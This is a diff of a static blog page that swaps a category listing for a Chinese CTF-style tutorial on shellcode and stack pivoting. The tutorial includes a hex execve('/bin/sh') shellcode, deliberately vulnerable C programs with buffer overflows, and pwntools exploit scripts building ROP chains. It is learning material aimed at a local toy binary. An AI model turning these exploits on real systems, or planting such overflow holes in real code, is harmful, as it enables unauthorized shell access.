@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.7.6">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/categories/栈/page/2/"/>
+  
+  <link rel="canonical" href="http://example.com/2022/12/19/对于shellcode的一些理解/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -32,17 +32,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Category: 栈 - Chen</title>
+  <title>对于shellcode的一些理解 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="Chen">
-<meta property="og:url" content="http://example.com/categories/%E6%A0%88/page/2/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对于shellcode的一些理解">
+<meta property="og:url" content="http://example.com/2022/12/19/%E5%AF%B9%E4%BA%8Eshellcode%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="ChenBlog">
+<meta property="og:description" content="仅凭一段机器码 为什么shellcode可以篡改程序执行流 使其达到我们想要的结果 并且shellcode不同于rop链 并不能只是简单的覆盖ret addr为shellcode就可以达到效果 二者不同在哪里？ 为什么bss段如果没有可执行权限的话就不能执行shellcode 但是同样的情况下就可以通过在bss段上写入rop链 随后栈迁移来控制程序执行流？ 这些疑问一一来解决一下 首先 什么是sh">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2022-12-19T07:50:51.000Z">
+<meta property="article:modified_time" content="2022-12-22T12:03:42.276Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2312,7 +2314,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper  search' style="display: none;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://s1.ax1x.com/2022/11/11/zCx6gA.png"></div>
 
@@ -2359,19 +2361,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-
 <div id="l_main" class=''>
-  
-    
-      
-  <section class="post-list">
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/18/栈的基础知识2/">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/19/对于shellcode的一些理解/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2380,289 +2372,265 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="ChenBlog">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/09/18/%E6%A0%88%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/"  itemprop="url">
-        栈的基础知识2
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
     
-      
-        想了想还是专门列一个板块来详讲虚拟内存和栈的详细结构，刚好自己这块的了解也是一知半解的，顺便扫盲一下
-cpu缓存从这个问题开始入手整个知识点体系吧
-通常情况下，我们可以用cache的大小来区分一个cpu的性能
-cache是什么？cache指的是cpu的三级缓存，L1，L2，L3
-由于cpu的运算能力远远大于数据传输
-所以cpu在接下来的操作会用到的数据就会存放到他自己的缓存中
-防止产生传输速...
-      
+    
+      <h1 class="title" itemprop="name headline">
+        对于shellcode的一些理解
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/%E5%9F%BA%E7%A1%80/">基础</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/%E5%9F%BA%E7%A1%80/" itemprop="url"><span itemprop="name">基础</span></a>
+      </span>
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-09-18T21:54:27+08:00">2022-09-18</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-            </span>
+
+
           
         
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-12-19T15:50:51+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Dec 19, 2022</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
       </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <p>仅凭一段机器码 为什么shellcode可以篡改程序执行流 使其达到我们想要的结果</p>
+<p>并且shellcode不同于rop链 并不能只是简单的覆盖ret addr为shellcode就可以达到效果 二者不同在哪里？</p>
+<p>为什么bss段如果没有可执行权限的话就不能执行shellcode 但是同样的情况下就可以通过在bss段上写入rop链 随后栈迁移来控制程序执行流？ 这些疑问一一来解决一下</p>
+<p>首先 什么是shellcode?</p>
+<p>wiki上是这样定义的:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called &quot;shellcode&quot; because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode.</span><br></pre></td></tr></table></figure>
+
+<p>其是一段机器码 用来启动一个命令界面 攻击者可以用其来控制漏洞机器</p>
+<p>通常的shellcode长什么样？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure>
+
+<p>上面是一段23字节的64位shellcode 可以用来执行system(&#x2F;bin&#x2F;sh)</p>
+<p>编写下面的程序 并且把NX保护关闭</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> magic[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;this is a test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input shellcode to bss&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,magic,<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modify the retaddr&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>向bss段中写入shellcode 并且修改retaddr为magic数组的首地址</p>
+<p>但是如果想要直接覆盖ret addr为shellcode那么就无法达到同样的攻击效果</p>
+<p>这是因为覆盖ret addr 实际上利用栈帧结束后 自带的两行指令 leave 和ret(外平栈)</p>
+<p>来使esp和ebp指针指向父函数的栈帧 继续执行上一步操作 也就是说 ret add需要是一个地址 指向一连串的指令或者是shellcode这样的字节流数据</p>
+<p>当然了 也正是出于栈帧的这种回归到父函数的操作 延申出了一种栈溢出手法叫做 栈迁移</p>
+<p>下文不做基础解释 而是进行一个额外的知识扩展</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;input shellcode to bss&quot;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">bss_addr = <span class="number">0x601060</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;modify the retaddr&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>如果打开NX保护 也就是使bss段不可执行 那么shellcode就无法执行</p>
+<p>但是如果我们将bss段中的数据改为一串rop链 通过栈迁移的办法 看能不能实现系统调用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> magic[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    system(<span class="string">&quot;echo this is a test&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh gift!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input shellcode to bss&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,magic,<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modify the retaddr&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>给了system函数和字符串&#x2F;bin&#x2F;sh 很简单的rop64 不过我们不用覆盖ret addr来做 我们在bss段中构造rop链 然后栈迁移 注意此时NX保护打开了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;input shellcode to bss&quot;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x400753</span></span><br><span class="line">binsh_addr = <span class="number">0x400788</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">system_addr = <span class="number">0x400520</span></span><br><span class="line">leave_addr = <span class="number">0x4006eb</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">gadget1_addr = <span class="number">0x400730</span></span><br><span class="line">payload = p64(ret_addr)*<span class="number">100</span>+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;modify the retaddr&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>唯一不好理解的地方在于为什么要多出来一百个字长的ret指令 首先 外平栈中ret指令相当于pop eip</p>
+<p>弹出了一个栈空间 所以相当于往低地址的方向抬高栈顶</p>
+<p>其次 我们需要明白为什么需要抬高栈顶 如果我们不抬的话会出现什么问题？</p>
+<p>下面是没有p64(ret_addr)*100的情况 我们用pwndgb来查看一下此时的栈</p>
+<p><img src="https://pic.imgdb.cn/item/63a43dba08b6830163c6bc38.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/63a43dba08b6830163c6bc38.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>我们本来是想要将栈迁移至0x601080 但是此时指向了0x600f00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000600F00                 Elf64_Dyn &lt;2, 60h&gt;      ; DT_PLTRELSZ</span><br><span class="line">LOAD:0000000000600F10                 Elf64_Dyn &lt;14h, 7&gt;      ; DT_PLTREL</span><br><span class="line">LOAD:0000000000600F20                 Elf64_Dyn &lt;17h, 400488h&gt; ; DT_JMPREL</span><br><span class="line">LOAD:0000000000600F30                 Elf64_Dyn &lt;7, 400428h&gt;  ; DT_RELA</span><br><span class="line">LOAD:0000000000600F40                 Elf64_Dyn &lt;8, 60h&gt;      ; DT_RELASZ</span><br><span class="line">LOAD:0000000000600F50                 Elf64_Dyn &lt;9, 18h&gt;      ; DT_RELAENT</span><br><span class="line">LOAD:0000000000600F60                 Elf64_Dyn &lt;6FFFFFFEh, 400408h&gt; ; DT_VERNEED</span><br><span class="line">LOAD:0000000000600F70                 Elf64_Dyn &lt;6FFFFFFFh, 1&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:0000000000600F80                 Elf64_Dyn &lt;6FFFFFF0h, 4003F6h&gt; ; DT_VERSYM</span><br><span class="line">LOAD:0000000000600F90                 Elf64_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>
+
+<p>ida一般以load段中的内容来解析二进制文件 但是为什么esp会指向这里呢？</p>
+<p>此时的栈帧空间迁移到了bss段 但是栈是由高地址往低地址处写 而bss段上方不远处是got表 很明显不能这样篡改got表</p>
+<p>因为程序无法完成正常的栈迁移 如果你尝试过往test段迁移 就不会出现这种情况</p>
+<p>所以这里利用ret指令抬高栈顶 跨过got表 就可以成功栈迁移 </p>
+<p>同理 如果我们写入的bss段处地址离got表远一点  也可以达到同样的效果 如果你有做过一些栈迁移的题目 你会发现网上的exp迁移至的地址往往会偏差几百个字节 也是同理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;input shellcode to bss&quot;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x400753</span></span><br><span class="line">binsh_addr = <span class="number">0x400788</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span>+<span class="number">0x300</span></span><br><span class="line">system_addr = <span class="number">0x400520</span></span><br><span class="line">leave_addr = <span class="number">0x4006eb</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">gadget1_addr = <span class="number">0x400730</span></span><br><span class="line">payload = cyclic(<span class="number">0x300</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;modify the retaddr&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里说个题外话 这种因为bss段和got表近导致的情况还是很常见的 在出unlink题目的时候 也会遇到这种情况 不能做到任意写 但是可以通过出题的时候多声明一个全局数组 使其位于任意写的数组低地址处 详见以往的博客</p>
+<p>至此 我们可以浅显的得出一个结论：</p>
+<p>1.当程序没有开启NX保护的时候 并且我们得知栈地址或者bss段地址(人话:写入shellcode的地址) 可以通过ret2shellcode来解决题目</p>
+<p>2.当程序没有打开NX保护 并且栈溢出的长度仅仅只有覆盖ret addr的长度 而且我们拥有往bss段(或者是rw-p权限的空间 即可读可写)</p>
+<p>我们可以通过往该空间写入rop链 随后劫持esp和ebp栈迁移</p>
+<p>要素在于理解说shellcode不同于rop链 其是一串字节流 可以达到特殊命令的字节流 </p>
+<p>同时 在日后的题目中  要小心因为bss段和got表过于近而导致的栈空间出错 并能意识到这个问题</p>
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2022/09/18/%E6%A0%88%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-12-22T20:03:42+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Dec 22, 2022</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/17/ROP/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/12/19/%E5%AF%B9%E4%BA%8Eshellcode%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/&title=对于shellcode的一些理解 - Chen&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/12/19/%E5%AF%B9%E4%BA%8Eshellcode%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/&title=对于shellcode的一些理解 - Chen&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/12/19/%E5%AF%B9%E4%BA%8Eshellcode%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/&title=对于shellcode的一些理解 - Chen&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
   
   
+
   
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2022/12/19/hitcontraining-heapcreator/'>
+          <p class='title'>hitcontraining_heapcreator<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>做完这道题又学到一种合并堆的手法 感觉收获颇丰
+checksec 看一下
+1234567[!] Could not populate PLT: future feature annotation...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2022/12/19/%E5%AF%B9%E4%BA%8Eshellcode%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/09/17/ROP/"  itemprop="url">
-        ROP
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        动态链接和静态链接静态链接和动态链接的相关概念，我们在栈溢出篇曾粗略提到过
-我们说到，为了防止每次调用函数都需要将函数的libc库拷贝到文件中，加大文件的存储占用
-不如在程序运行时将动态库加载到内存中，多个程序运行只需要调用一份
-静态库特点：1.静态库对函数库的链接是放在编译时期完成的2.程序在运行时与函数库再无瓜葛，移植方便。3.浪费空间和资源，因为所有相关的目标文件与牵涉到的函数库被链接...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-09-17T09:26:39+08:00">2022-09-17</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/09/17/ROP/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
+    <div id="layoutHelper-comments"></div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/15/32位栈溢出/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/09/15/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/"  itemprop="url">
-        栈溢出
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        继上文点到栈溢出的基础原理，本文来详细演示如何完成一题栈溢出
-checksec的使用及保护机制了解操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险
-在我们开始尝试做题之前，我们先得知道这道题开启了哪些安全机制，我们又该如何绕过其安全机制
-这里便使用到了checksec工具
-
-Arch：程序架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？
-R...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-09-15T12:26:15+08:00">2022-09-15</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/09/15/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/13/栈的基础知识/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/09/13/%E6%A0%88%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"  itemprop="url">
-        栈的基础知识
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        什么是栈？在了解栈相关的知识前，我们需要一些汇编代码的基础
